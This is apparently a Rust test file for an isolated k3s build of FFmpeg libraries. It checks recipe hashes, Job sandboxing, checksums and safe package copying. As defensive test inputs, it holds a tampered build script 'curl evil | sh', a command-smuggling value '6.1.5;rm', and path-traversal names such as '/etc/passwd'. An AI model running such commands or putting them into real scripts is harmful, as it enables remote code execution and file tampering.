//! "Build it here (k3s)": the version map, the recipe check, the consent text, the Job's isolation, checksum failures, the output copy, the
//! stamp and the rebuild note. Fakes only: `kubectl` is a closure, the filesystem is a temporary folder. No cluster, no download, no build.

use crate::avbuild::*;
use std::cell::RefCell;
use std::path::{Path, PathBuf};
use std::time::Duration;

const SHA: &str = "05fbe9db1f5452a3605bb1d9bf91da9d4bb08162891692e4f172b58c49109412";
const DIGEST: &str = "1e42bbe2508154c9126d48c2b8a75420c3544343bf86fd041fb7527e017a4b4a";
const SO: &str = "libavcodec.so.60,libavformat.so.60,libavutil.so.58,libavfilter.so.9,libswresample.so.4,libswscale.so.7";

fn map_line(pat: &str) -> String {
    format!("{pat}  6.1.5  {SHA}  docker.io/library/alpine@sha256:{DIGEST}  {SO}")
}

fn temp(name: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("iyakki-avbuild-{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn entry() -> MapEntry {
    parse_line(&map_line("0.1.0-alpha.*")).unwrap()
}

/// A bridge folder (map + recipe + hash) like the one the image carries.
fn bridge(name: &str) -> PathBuf {
    let b = temp(name);
    std::fs::create_dir_all(b.join("recipe/files")).unwrap();
    let (build, conf, chk) = ("#!/bin/sh\necho build\n", "--disable-gpl\n--disable-nonfree\n--disable-version3\n--enable-decoder=h264\n", "#!/bin/sh\nexit 0\n");
    std::fs::write(b.join("recipe/build.sh"), build).unwrap();
    std::fs::write(b.join("recipe/configure-args.txt"), conf).unwrap();
    std::fs::write(b.join("recipe/files/iyakki-av-check"), chk).unwrap();
    std::fs::write(b.join("RECIPE.SHA256"), recipe_hash(build.as_bytes(), conf.as_bytes(), chk.as_bytes())).unwrap();
    b
}

// ---- 1. the version map entry

#[test]
fn the_bundled_map_parses_and_its_recipe_hash_matches_the_bundled_recipe() {
    let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../dist/addons/ffmpeg-libs/bridge");
    let real: Vec<&str> = BUNDLED_MAP.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')).collect();
    assert!(!real.is_empty());
    for l in real {
        let e = parse_line(l).unwrap();
        assert!(e.builder.contains("@sha256:") && e.sonames.len() == 6 && !e.line().contains("ffmpeg.org"), "{e:?}");
    }
    Recipe::load(&dir).expect("the recipe in dist matches RECIPE.SHA256 (run sync-bridge.sh after changing it)");
}

#[test]
fn a_map_line_is_parsed_strictly_and_matched_like_the_repositorys_lookup_tool() {
    let e = entry();
    assert_eq!((e.ffmpeg.as_str(), e.sha256.as_str(), e.registry().as_str(), e.sonames.len()), ("6.1.5", SHA, "docker.io", 6));
    assert_eq!(e.source_url(), "https://ffmpeg.org/releases/ffmpeg-6.1.5.tar.xz");
    assert_eq!(parse_line(&e.line()).unwrap(), e, "the normalised line parses back");
    for bad in [
        "0.1.0 6.1.5".to_string(),
        map_line("0.1.0").replace(SHA, "abc"),
        map_line("0.1.0").replace(&format!("@sha256:{DIGEST}"), ":latest"),
        map_line("0.1.0").replace("6.1.5", "6.1.5;rm"),
        map_line("0.1.*x"),
        map_line("0.1.0").replace("libavcodec.so.60", "avcodec"),
    ] {
        assert!(parse_line(&bad).is_err(), "{bad}");
    }
    let map = format!("# comment\n\n{}\n{}\n", map_line("0.1.0-alpha.*"), map_line("0.2.0"));
    assert_eq!(lookup(&map, "0.1.0-alpha.7").unwrap().pattern, "0.1.0-alpha.*");
    assert_eq!(lookup(&map, "0.2.0").unwrap().pattern, "0.2.0");
    assert!(pattern_matches("0.1.*", "0.1.9") && !pattern_matches("0.1.*", "0.10.0") && !pattern_matches("0.1.0", "0.1.0-rc1"));
    // the first match wins
    let two = format!("{}\n{}\n", map_line("0.1.*").replace("6.1.5", "6.1.4"), map_line("0.1.2"));
    assert_eq!(lookup(&two, "0.1.2").unwrap().ffmpeg, "6.1.4");
}

#[test]
fn the_image_sonames_must_equal_the_entrys() {
    let e = entry();
    let image: Vec<String> = e.sonames.iter().rev().cloned().collect();
    assert!(check_sonames(&e, &image).is_ok());
    assert!(check_sonames(&e, &image[1..]).unwrap_err().contains("needs"));
}

// ---- 8. no map entry

#[test]
fn no_entry_for_this_version_says_so_and_points_to_the_mirror_and_file_routes() {
    let e = lookup(&map_line("9.9.9"), "0.1.0-alpha.1").unwrap_err();
    assert!(e.contains("no build recipe") && e.contains("mirror") && e.contains("/local/packages"), "{e}");
    assert!(lookup("", "0.1.0").is_err());
}

// ---- 4. the recipe comes from the bundled copy, checked against its hash

#[test]
fn the_recipe_is_refused_when_a_file_no_longer_matches_its_hash_or_the_licence_line_is_changed() {
    let b = bridge("recipe");
    let r = Recipe::load(&b).unwrap();
    assert_eq!(r.hash.len(), 64);
    std::fs::write(b.join("recipe/build.sh"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let e = Recipe::load(&b).unwrap_err();
    assert!(e.contains("does not match") && e.contains(&r.hash) && e.contains("nothing was started"), "{e}");
    // a consistent hash over a GPL line is still refused
    let (build, chk) = ("#!/bin/sh\n", "x\n");
    let conf = "--disable-gpl\n--disable-nonfree\n--enable-gpl\n";
    std::fs::write(b.join("recipe/build.sh"), build).unwrap();
    std::fs::write(b.join("recipe/configure-args.txt"), conf).unwrap();
    std::fs::write(b.join("recipe/files/iyakki-av-check"), chk).unwrap();
    std::fs::write(b.join("RECIPE.SHA256"), recipe_hash(build.as_bytes(), conf.as_bytes(), chk.as_bytes())).unwrap();
    assert!(Recipe::load(&b).unwrap_err().contains("--enable-gpl"));
}

// ---- 3. consent text

#[test]
fn the_consent_text_names_hosts_size_time_disk_licence_and_the_patent_note() {
    let t = consent_text(&entry(), "x86_64").join("\n");
    for must in ["ffmpeg.org", "docker.io", "Alpine package mirror", "Total download", "minutes", "4 GB", "LGPL-2.1", "--enable-gpl", "Patents", "H.264", "AAC", "6.1.5", SHA, DIGEST, "libavcodec.so.60", "Nothing is installed", "ships and hosts no FFmpeg"] {
        assert!(t.contains(must), "missing `{must}` in:\n{t}");
    }
    assert!(!t.contains("{}"), "{t}");
}

// ---- 4. the isolated Job

#[test]
fn the_job_is_unprivileged_without_a_token_with_one_host_folder_limits_a_time_limit_and_the_recipe_as_a_config_map() {
    let b = bridge("job");
    let r = Recipe::load(&b).unwrap();
    let m = manifests(&entry(), &r, Path::new("/data/addons/.build/out"));
    let items = m["items"].as_array().unwrap();
    let kind = |k: &str| items.iter().find(|i| i["kind"] == k).unwrap_or_else(|| panic!("no {k}"));
    let job = kind("Job");
    let pod = &job["spec"]["template"]["spec"];
    let c = &pod["containers"][0];
    assert_eq!(pod["automountServiceAccountToken"], false);
    assert_eq!((pod["hostNetwork"].as_bool(), pod["hostPID"].as_bool()), (Some(false), Some(false)));
    assert_eq!(c["securityContext"]["privileged"], false);
    assert_eq!(c["securityContext"]["allowPrivilegeEscalation"], false);
    assert_eq!(c["securityContext"]["capabilities"]["drop"][0], "ALL");
    assert!(!c["securityContext"]["capabilities"]["add"].as_array().unwrap().iter().any(|x| matches!(x.as_str(), Some("SYS_ADMIN" | "NET_ADMIN" | "SYS_PTRACE" | "NET_RAW"))));
    assert_eq!(job["spec"]["activeDeadlineSeconds"], TIME_LIMIT_SECS);
    assert_eq!(job["spec"]["backoffLimit"], 0);
    for k in ["cpu", "memory", "ephemeral-storage"] {
        assert!(c["resources"]["limits"][k].is_string(), "{k} limited");
    }
    assert_eq!(c["image"], entry().builder.as_str());
    // exactly one host mount: the output folder
    let vols = pod["volumes"].as_array().unwrap();
    let host: Vec<_> = vols.iter().filter(|v| v.get("hostPath").is_some()).collect();
    assert_eq!(host.len(), 1);
    assert_eq!(host[0]["hostPath"]["path"], "/data/addons/.build/out");
    assert!(vols.iter().any(|v| v["emptyDir"]["sizeLimit"].is_string()), "scratch space is bounded");
    // the recipe is the bundled text, passed as a ConfigMap
    let cm = kind("ConfigMap");
    assert_eq!(cm["data"]["build.sh"], r.build_sh.as_str());
    assert_eq!(cm["data"]["configure-args.txt"], r.configure_args.as_str());
    // the command carries the hash to check again, and the pinned arguments as separate words (no shell interpolation)
    let cmd: Vec<&str> = c["command"].as_array().unwrap().iter().map(|x| x.as_str().unwrap()).collect();
    assert_eq!(&cmd[3..], ["iyakki-av-build", r.hash.as_str(), "6.1.5", SHA, SO]);
    assert!(cmd[2].contains("sha256sum") && cmd[2].contains("exit 6"));
    // egress is limited to name lookups, HTTP and HTTPS; nothing comes in
    let np = kind("NetworkPolicy");
    assert_eq!(np["spec"]["egress"][0]["ports"].as_array().unwrap().len(), 4);
    assert_eq!(np["spec"]["ingress"].as_array().unwrap().len(), 0);
}

// ---- 5. checksum failure

#[test]
fn a_checksum_failure_names_the_file_and_both_hashes() {
    let log = "[1/5] downloading https://ffmpeg.org/releases/ffmpeg-6.1.5.tar.xz\nchecksum of ffmpeg-6.1.5.tar.xz differs: expected aaaa, got bbbb\n";
    assert_eq!(checksum_failure(log), Some(("ffmpeg-6.1.5.tar.xz".into(), "aaaa".into(), "bbbb".into())));
    let m = explain_failure(log);
    assert!(m.contains("ffmpeg-6.1.5.tar.xz") && m.contains("aaaa") && m.contains("bbbb") && m.contains("before using it") && m.contains("mirror"), "{m}");
    assert!(explain_failure("recipe hash differs: expected 1, got 2").contains("does not match the bundled one"));
    assert!(explain_failure("a\nb\nc\nboom").contains("boom"));
    assert!(explain_failure("").contains("no output"));
}

// ---- 6. the output copy

#[test]
fn the_copy_into_local_packages_refuses_any_path_outside_the_folder() {
    let d = temp("copy");
    let (out, other) = (d.join("out"), d.join("other"));
    std::fs::create_dir_all(&out).unwrap();
    std::fs::create_dir_all(&other).unwrap();
    let name = "ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz";
    std::fs::write(out.join(name), b"package").unwrap();
    let dest = copy_into_packages(&d, &out, name, "x86_64").unwrap();
    assert_eq!(dest, std::fs::canonicalize(d.join("local/packages")).unwrap().join(name));
    assert_eq!(std::fs::read(&dest).unwrap(), b"package");
    use std::os::unix::fs::PermissionsExt;
    assert_eq!(std::fs::metadata(&dest).unwrap().permissions().mode() & 0o777, 0o640);
    assert!(std::fs::read_dir(d.join("local/packages")).unwrap().flatten().all(|e| !e.file_name().to_string_lossy().ends_with(".part")));
    // names that climb out, other names, other processors
    for bad in ["../other/ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz", "/etc/passwd", "ffmpeg-libs-../x-linux-musl-x86_64.tar.gz", "evil.tar.gz", "ffmpeg-libs-6.1.5-linux-musl-aarch64.tar.gz"] {
        assert!(copy_into_packages(&d, &out, bad, "x86_64").is_err(), "{bad}");
    }
    // a link in the output folder (even to a file of the right name elsewhere) is refused
    std::fs::write(other.join(name), b"secret").unwrap();
    std::fs::remove_file(out.join(name)).unwrap();
    std::os::unix::fs::symlink(other.join(name), out.join(name)).unwrap();
    let e = copy_into_packages(&d, &out, name, "x86_64").unwrap_err();
    assert!(e.contains("not a plain file"), "{e}");
    assert_eq!(std::fs::read(&dest).unwrap(), b"package", "the earlier package is untouched");
    // a target that is a link is refused too
    std::fs::remove_file(out.join(name)).unwrap();
    std::fs::write(out.join(name), b"new").unwrap();
    std::fs::remove_file(&dest).unwrap();
    std::os::unix::fs::symlink(other.join(name), &dest).unwrap();
    assert!(copy_into_packages(&d, &out, name, "x86_64").unwrap_err().contains("not a plain file"));
    assert_eq!(std::fs::read(other.join(name)).unwrap(), b"secret");
}

#[test]
fn the_package_must_agree_with_its_sha256_file_before_it_is_copied() {
    let d = temp("pkg");
    let name = "ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz";
    assert!(find_package(&d, "x86_64").unwrap_err().contains("no package"));
    std::fs::write(d.join(name), b"bytes").unwrap();
    assert!(find_package(&d, "x86_64").unwrap_err().contains(".sha256 is missing"));
    std::fs::write(d.join(format!("{name}.sha256")), format!("{}  {name}\n", "0".repeat(64))).unwrap();
    let e = find_package(&d, "x86_64").unwrap_err();
    assert!(e.contains("Checksum failure") && e.contains(&"0".repeat(64)) && e.contains(&crate::clis::sha256_hex(b"bytes")), "{e}");
    std::fs::write(d.join(format!("{name}.sha256")), format!("{}  {name}\n", crate::clis::sha256_hex(b"bytes"))).unwrap();
    assert_eq!(find_package(&d, "x86_64").unwrap(), name);
}

// ---- the whole run with a fake k3s

struct Fake {
    ready: bool,
    /// What the Job reports ("1," succeeded, ",1" failed, "," still running) and its log.
    job: String,
    log: String,
    calls: RefCell<Vec<String>>,
    /// Writes the package into the output folder when the manifest is applied (the fake build).
    on_apply: Box<dyn Fn(&Path)>,
}

fn run(f: &Fake, data: &Path, br: &Path, map: &str, polls: u32) -> Result<String, String> {
    let kube = |a: &[&str]| -> (bool, String) {
        f.calls.borrow_mut().push(a.join(" "));
        if a.first() == Some(&"get") && a.get(1) == Some(&"nodes") {
            return (true, if f.ready { "True".into() } else { String::new() });
        }
        if a.first() == Some(&"apply") {
            // the manifest is a file the agent wrote: read it back like kubectl would
            let text = std::fs::read_to_string(a[2]).unwrap();
            assert!(text.contains("\"kind\":\"Job\""));
            (f.on_apply)(&out_dir(data));
            return (true, "created".into());
        }
        if a.contains(&"job") && a.contains(&"get") {
            return (true, f.job.clone());
        }
        if a.contains(&"logs") {
            return (true, f.log.clone());
        }
        (true, String::new())
    };
    let said = RefCell::new(Vec::<String>::new());
    let say = |s: &str| said.borrow_mut().push(s.to_string());
    let cx = RunCx { data, bridge: br, map_text: map, version: "0.1.0-alpha.1", arch: "x86_64", kubectl: &kube, sleep: &|_: Duration| {}, say: &say, max_polls: polls };
    build(&cx)
}

fn fake(job: &str, log: &str) -> Fake {
    Fake { ready: true, job: job.into(), log: log.into(), calls: RefCell::new(vec![]), on_apply: Box::new(|_| {}) }
}

fn writes_package(out: &Path) {
    let name = "ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz";
    std::fs::write(out.join(name), b"pkg").unwrap();
    std::fs::write(out.join(format!("{name}.sha256")), format!("{}  {name}\n", crate::clis::sha256_hex(b"pkg"))).unwrap();
}

// ---- 2. only with k3s running

#[test]
fn without_a_running_k3s_nothing_is_started_and_the_message_points_to_the_file_and_mirror_routes() {
    let d = temp("nok3s");
    let mut f = fake("1,", "");
    f.ready = false;
    let e = run(&f, &d, &bridge("nok3s-b"), &map_line("0.1.0-alpha.*"), 3).unwrap_err();
    assert!(e.contains("k3s") && e.contains("/local/packages") && e.contains("mirror"), "{e}");
    assert!(f.calls.borrow().iter().all(|c| c.starts_with("get nodes")), "no Job was applied: {:?}", f.calls.borrow());
    assert!(!scratch_dir(&d).exists());
}

#[test]
fn no_map_entry_stops_before_any_cluster_call_beyond_the_gate() {
    let d = temp("noentry");
    let f = fake("1,", "");
    let e = run(&f, &d, &bridge("noentry-b"), &map_line("9.9.9"), 3).unwrap_err();
    assert!(e.contains("no build recipe") && e.contains("mirror"), "{e}");
    assert!(!f.calls.borrow().iter().any(|c| c.starts_with("apply")));
}

#[test]
fn a_good_build_copies_the_package_into_local_packages_installs_nothing_and_cleans_up() {
    let d = temp("ok");
    let mut f = fake("1,", "done");
    f.on_apply = Box::new(writes_package);
    // the sonames of the entry must be the image's: this test image has the default ABI
    let r = run(&f, &d, &bridge("ok-b"), &map_line("0.1.0-alpha.*"), 3);
    let r = r.expect("build");
    assert!(r.contains("Nothing is installed yet") && r.contains("press Install"), "{r}");
    assert!(d.join("local/packages/ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz").is_file());
    assert!(!avaddon_dir_exists(&d), "the build installs nothing");
    assert!(!scratch_dir(&d).exists(), "scratch removed");
    assert!(f.calls.borrow().last().unwrap().starts_with("delete namespace"), "the namespace (pod, ConfigMap) is removed");
    assert!(std::fs::read_to_string(d.join("addons/.built-here")).unwrap().contains("package ffmpeg-libs-6.1.5"));
}

fn avaddon_dir_exists(d: &Path) -> bool {
    crate::avaddon::addon_dir(d).exists()
}

#[test]
fn a_failed_build_shows_the_checksum_failure_and_still_cleans_up() {
    let d = temp("fail");
    let f = fake(",1", "checksum of ffmpeg-6.1.5.tar.xz differs: expected aaaa, got bbbb");
    let e = run(&f, &d, &bridge("fail-b"), &map_line("0.1.0-alpha.*"), 3).unwrap_err();
    assert!(e.contains("ffmpeg-6.1.5.tar.xz") && e.contains("aaaa") && e.contains("bbbb"), "{e}");
    assert!(!d.join("local/packages").exists() || std::fs::read_dir(d.join("local/packages")).unwrap().next().is_none());
    assert!(!scratch_dir(&d).exists());
    assert!(f.calls.borrow().last().unwrap().starts_with("delete namespace"));
}

#[test]
fn a_build_that_never_finishes_is_stopped_with_the_time_limit_named() {
    let d = temp("slow");
    let f = fake(",", "still compiling");
    let e = run(&f, &d, &bridge("slow-b"), &map_line("0.1.0-alpha.*"), 2).unwrap_err();
    assert!(e.contains("time limit") && e.contains("60 minutes"), "{e}");
    assert!(f.calls.borrow().last().unwrap().starts_with("delete namespace"));
}

#[test]
fn a_changed_recipe_stops_the_build_before_the_cluster_is_touched() {
    let d = temp("badrecipe");
    let b = bridge("badrecipe-b");
    std::fs::write(b.join("recipe/build.sh"), "changed").unwrap();
    let f = fake("1,", "");
    assert!(run(&f, &d, &b, &map_line("0.1.0-alpha.*"), 2).unwrap_err().contains("does not match"));
    assert!(!f.calls.borrow().iter().any(|c| c.starts_with("apply")));
}

#[test]
fn the_request_marker_is_read_once() {
    let d = temp("req");
    assert!(!take_request(&d));
    write_request(&d).unwrap();
    assert!(take_request(&d) && !take_request(&d));
}

// ---- 7. the stamp and the rebuild note

#[test]
fn the_gstreamer_version_is_read_from_the_library_file_name() {
    assert_eq!(gst_from_soname("libgstreamer-1.0.so.0.2406.0").as_deref(), Some("1.24.6"));
    assert_eq!(gst_from_soname("libgstreamer-1.0.so.0.2610.1").as_deref(), Some("1.26.10"));
    assert_eq!(gst_from_soname("libother.so"), None);
    let d = temp("gst");
    std::fs::write(d.join("libgstreamer-1.0.so.0.2406.0"), b"x").unwrap();
    std::os::unix::fs::symlink("libgstreamer-1.0.so.0.2406.0", d.join("libgstreamer-1.0.so.0")).unwrap();
    assert_eq!(image_gst_version(&[Path::new("/nonexistent"), &d]).as_deref(), Some("1.24.6"));
    assert_eq!(image_gst_version(&[Path::new("/nonexistent")]), None);
}

#[test]
fn the_stamp_goes_with_the_installed_add_on_and_a_mismatch_is_reported() {
    let d = temp("stamp");
    let e = entry();
    let name = "ffmpeg-libs-6.1.5-linux-musl-x86_64.tar.gz";
    save_built_here_with(&d, name, &e, "1.24.6").unwrap();
    let addon = d.join("addon");
    std::fs::create_dir_all(&addon).unwrap();
    // another package installed: no stamp
    stamp_after_install(&d, "ffmpeg-libs-other-linux-musl-x86_64.tar.gz", &addon);
    assert_eq!(stamp_state_with(&addon, &map_line("0.1.0-alpha.*"), "0.1.0-alpha.1", "1.24.6"), StampState::NotBuiltHere);
    stamp_after_install(&d, name, &addon);
    assert!(addon.join("BUILD-STAMP").is_file());
    let map = map_line("0.1.0-alpha.*");
    assert_eq!(stamp_state_with(&addon, &map, "0.1.0-alpha.1", "1.24.6"), StampState::Current);
    // an image update changes GStreamer
    match stamp_state_with(&addon, &map, "0.1.0-alpha.2", "1.26.0") {
        StampState::Stale(w) => assert!(w.contains("1.24.6") && w.contains("1.26.0"), "{w}"),
        s => panic!("{s:?}"),
    }
    // or the map entry (another FFmpeg)
    let other = map.replace("6.1.5", "6.1.6");
    assert!(matches!(stamp_state_with(&addon, &other, "0.1.0-alpha.1", "1.24.6"), StampState::Stale(w) if w.contains("map entry")));
    // or the version has no entry any more
    assert!(matches!(stamp_state_with(&addon, &map_line("9.9.9"), "0.1.0-alpha.1", "1.24.6"), StampState::Stale(w) if w.contains("no entry")));
}

#[test]
fn the_rebuild_note_is_not_an_automatic_rebuild() {
    let (t, b) = rebuild_note("the image's GStreamer changed from 1.24.6 to 1.26.0");
    assert_eq!(t, "Browser audio and video needs a rebuild");
    assert!(b.contains("1.26.0") && b.contains("without H.264") && b.contains("Build it here (k3s)") && b.contains("Nothing is rebuilt on its own"));
}

#[test]
fn a_stale_stamp_makes_the_engine_start_without_the_add_on_until_rebuilt() {
    // the engine environment is empty unless the add-on is Ready (avaddon.rs); detect() turns a stale built-here add-on into Absent.
    let env = crate::avaddon::engine_env(&crate::avaddon::Addon::Absent, Path::new("/p"), Path::new("/l"), Path::new("/prof"), "m");
    assert!(env.is_empty());
    // and installing the add-on from a stamped package writes the stamp through the real installer path
    let d = temp("stale-detect");
    let addon = crate::avaddon::addon_dir(&d);
    std::fs::create_dir_all(addon.join("lib")).unwrap();
    std::fs::write(addon.join("BUILD-STAMP"), "entry something old\ngstreamer 1.0.0\n").unwrap();
    assert!(matches!(stamp_state_with(&addon, &map_line("0.1.0-alpha.*"), "0.1.0-alpha.1", "1.24.6"), StampState::Stale(_)));
}

#[test]
fn installing_the_package_built_here_through_the_installer_writes_the_stamp() {
    use crate::avaddon_install::{plan, run, Places};
    let d = temp("inst");
    let e = entry();
    let names: Vec<String> = e.sonames.clone();
    // a package in the layout package-av-addon.sh makes
    let root = d.join("pkgsrc/ffmpeg-libs-6.1.5");
    std::fs::create_dir_all(root.join("lib")).unwrap();
    for n in &names {
        std::fs::write(root.join("lib").join(n), vec![7u8; 2048]).unwrap();
    }
    std::fs::write(root.join("COPYING.LGPLv2.1"), "lgpl").unwrap();
    std::fs::write(root.join("SOURCE-OFFER.txt"), "offer").unwrap();
    std::fs::write(root.join("NOTICE"), "FFmpeg version: 6.1.5\n  ./configure --prefix=/usr --disable-gpl --disable-nonfree\n").unwrap();
    let pkg = crate::avaddon_install::local_dir(&d);
    std::fs::create_dir_all(&pkg).unwrap();
    let name = format!("ffmpeg-libs-6.1.5-linux-musl-{}.tar.gz", std::env::consts::ARCH);
    let st = std::process::Command::new("tar").arg("czf").arg(pkg.join(&name)).arg("-C").arg(d.join("pkgsrc")).arg("ffmpeg-libs-6.1.5").status().unwrap();
    assert!(st.success());
    save_built_here_with(&d, &name, &e, "1.24.6").unwrap();
    let places = Places { data: d.clone(), media_root: d.join("none"), dev_drop: None, boot_packages: None, machine: std::env::consts::ARCH.into(), system_dirs: vec![], sonames: names };
    assert!(plan(&places).source.is_some(), "the built package goes through the existing review: {:?}", plan(&places).review);
    assert!(run(&places, false, &|_, _| Err("no network".into())).is_err(), "never installed without the confirmation");
    run(&places, true, &|_, _| Err("no network".into())).unwrap();
    let stamp = std::fs::read_to_string(crate::avaddon::addon_dir(&d).join("BUILD-STAMP")).unwrap();
    assert!(stamp.contains("entry 0.1.0-alpha.* 6.1.5") && stamp.contains("gstreamer 1.24.6"), "{stamp}");
}
